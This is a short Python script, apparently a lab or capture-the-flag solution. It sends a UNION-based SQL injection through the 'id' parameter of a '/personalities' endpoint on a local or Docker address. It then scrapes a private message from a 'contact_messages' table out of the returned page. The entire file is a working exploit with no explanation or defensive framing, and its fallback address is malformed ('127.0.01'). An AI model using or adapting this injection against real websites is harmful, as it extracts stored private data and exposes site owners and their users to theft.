import requests
import sys
import re
from bs4 import BeautifulSoup

# Address selection
addr = "172.17.0.2" if len(sys.argv) > 1 else "127.0.01"

# SQL injection code
query = "/personalities?id=5' UNION SELECT name, message FROM contact_messages WHERE mail LIKE 'james@bond.mi5"

# Final URL
url = "http://" + addr + query

# Doing request
r = requests.get(url)
soup = BeautifulSoup(r.content, 'html.parser')

# Parsing and getting nmessage
l = soup.findAll("a", {"class": "list-group-item"})
value = str(l[1])
m = re.search('james:(.+?)</', value)
message = m.group(1)
print(message)
    
